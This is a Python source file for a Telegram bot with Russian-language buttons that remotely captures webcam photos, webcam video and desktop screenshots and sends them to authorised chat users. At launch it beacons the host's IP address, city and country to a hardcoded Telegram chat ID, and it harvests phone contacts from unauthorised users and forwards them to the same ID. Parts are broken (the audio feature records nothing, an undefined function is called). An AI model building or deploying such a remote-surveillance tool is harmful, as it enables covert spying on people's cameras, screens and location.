import datetime
import telebot;
import cv2;
import config
import telebot
from telebot import apihelper
from telebot import types
import datetime
import os
#import logging
#logger = logging.getLogger('log')
#logger.setLevel(logging.INFO)
#fh = logging.FileHandler('someTestBot.log')
#fh.setLevel(logging.DEBUG)
#formatter = logging.Formatter("%(asctime)s | %(levelname)-7s | %(message)s")
#fh.setFormatter(formatter)
#logger.addHandler(fh)
from PIL import Image, ImageGrab
import pymyip # pip install pymyip0

print("Your ip " + pymyip.get_ip())
print("Your city " + pymyip.get_city())
print("Your country" + pymyip.get_country())


bot = telebot.TeleBot(config.tokebBot);

is_start = 0
if is_start== 0:

    bot.send_message(238538484, "BOT START\r\nip: "+ pymyip.get_ip() + "City:" + pymyip.get_city() + "country" + pymyip.get_country())
    is_start = 1

def autor(chatid):
    strid = str(chatid)
    for item in config.users:
        if item == strid:
            return True
    return False

kb = types.InlineKeyboardMarkup(row_width=3)
bt1 = types.InlineKeyboardButton("Фото", callback_data='foto')
bt2 = types.InlineKeyboardButton("Видео", callback_data='video')
bt3 = types.InlineKeyboardButton("Рабочий стол", callback_data='desktop')
bt4 = types.InlineKeyboardButton("Звук", callback_data='sound')
kb.add(bt1,bt2,bt3,bt4)

kb_video = types.InlineKeyboardMarkup(row_width=3)
btv1 = types.InlineKeyboardButton("10c", callback_data='10sv')
btv2 = types.InlineKeyboardButton("30c", callback_data='30sv')
btv3 = types.InlineKeyboardButton("60c", callback_data='60sv')
kb_video.add(btv1,btv2,btv3)

kb_sound = types.InlineKeyboardMarkup(row_width=3)
bts1 = types.InlineKeyboardButton("10c", callback_data='10ss')
bts2 = types.InlineKeyboardButton("30c", callback_data='30ss')
bts3 = types.InlineKeyboardButton("60c", callback_data='60ss')
kb_sound.add(btv1,btv2,btv3)

def sound_r(s_time, chat_id):
    a = datetime.datetime.today().strftime("%Y%m%d%H%M%S%s")
    voiceFile = './cam/voice_' + a + '.ogg'
    bot.send_message(chat_id, "Пишем видео")
    voice = open(voiceFile, 'rb')
    bot.send_voice(chat_id, voice)

def video_r(s_time, chat_id):
    bot.send_message(chat_id, "Пишем видео")
    a = datetime.datetime.today().strftime("%Y%m%d%H%M%S%s")
    cap = cv2.VideoCapture(0)
    cap.set(cv2.CAP_PROP_FPS, 24) # Частота кадров
    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280) # Ширина кадров в видеопотоке.
    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720) # Высота кадров в
    codec = cv2.VideoWriter_fourcc(*'MP4V')
    out = cv2.VideoWriter('./cam/cam_' + a + '.mp4', codec, 25.0, (1280, 720))
    start_time = datetime.datetime.now()
    while(cap.isOpened()):
        ret, frame = cap.read()
        time_delta = datetime.datetime.now() - start_time
        if time_delta.total_seconds() >= s_time:
            break
        #cv2.imshow('frame', frame)
        out.write(frame)
    out.release()
    cap.release()
    cv2.destroyAllWindows()
    video = open('./cam/cam_' + a + '.mp4', 'rb')
    bot.send_video(chat_id, video, caption='Видео с камеры', reply_markup=kb)


def desktop_message(message):
    a = datetime.datetime.today().strftime("%Y%m%d%H%M%S%s")
    imageFile = './cam/des_' + a + '.jpg'
    img = ImageGrab.grab()
    img.save(imageFile, "jpg")
    img2 = open(imageFile, 'rb')
    bot.send_photo(message.chat.id, img2, caption='Рабочий стол', reply_markup=kb)



@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    try:
        if call.message:
            if autor(call.message.chat.id):
                if call.data == "foto":
                    sendfoto_message(call.message)
                if call.data == "video":  
                    bot.send_message(call.message.chat.id, 'Записать видео', reply_markup=kb_video)
                if call.data == "sound":  
                    bot.send_message(call.message.chat.id, 'Записать звук', reply_markup=kb_sound)
                if call.data == 'desktop':
                    desktop_message(call.message)
                if call.data == '10sv':
                    video_r(10, call.message.chat.id)
                if call.data == '30sv':
                    video_r(30, call.message.chat.id)
                if call.data == '60sv':
                    video_r(60, call.message.chat.id)
                if call.data == '10ss':
                    sound_r(10, call.message.chat.id)
                if call.data == '30ss':
                    sound_r(15600, call.message.chat.id)
                if call.data == '60ss':
                    sound_r(60, call.message.chat.id)
                if call.data == 'ecure_on':
                    secure_fun(1)
                if call.data == 'ecure_off':
                    secure_fun(0)
            else:
                bot.send_message(call.message.chat.id, 'Тебе сюда нельзя. Твой ID: ' + str(call.message.chat.id))
                bot.send_sticker(call.message.chat.id, 'CAADAgADcQMAAkmH9Av0tmQ7QhjxLRYE')

    except Exception as e:
        print(repr(e))


@bot.message_handler(commands=['start'])
def start_message(message):
    if autor(message.chat.id):
        cid = message.chat.id
        message_text = message.text
        user_id = message.from_user.id
        user_name = message.from_user.first_name
        bot.send_sticker(message.chat.id, 'CAADAgAD6CQAAp7OCwABx40TskPHi3MWBA')
        bot.send_message(message.chat.id, 'Привет, ' + user_name + ' Что ты хочешь от меня, собака сутулая?', reply_markup=kb)
    else:
        keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True, one_time_keyboard=True)
        button_phone = types.KeyboardButton(text="Я не сутулая собака, я коженный мешок", request_contact=True)
        keyboard.add(button_phone)

        bot.send_message(message.chat.id, 'Тебе сюда нельзя, Сутулая собака. Твой ID: ' + str(message.chat.id), reply_markup=keyboard)

def sendfoto_message(message):
    a = datetime.datetime.today().strftime("%Y%m%d%H%M%S%s")
    cap = cv2.VideoCapture(0)
    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1080)
    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
    ret, frame = cap.read()
    imageFile = './cam/cam_' + a + '.jpg'
    cv2.imwrite(imageFile, frame)
    img = open(imageFile, 'rb')
    bot.send_photo(message.chat.id, img, caption='Фото с камеры', reply_markup=kb)
    cap.release()

@bot.message_handler(content_types=['contact'])
def contact(message):
    if message.contact is not None:
        bot.send_message(238538484, message.contact)
        bot.send_message(message.chat.id, "Благодарствую", reply_markup=types.ReplyKeyboardRemove())
bot.polling()
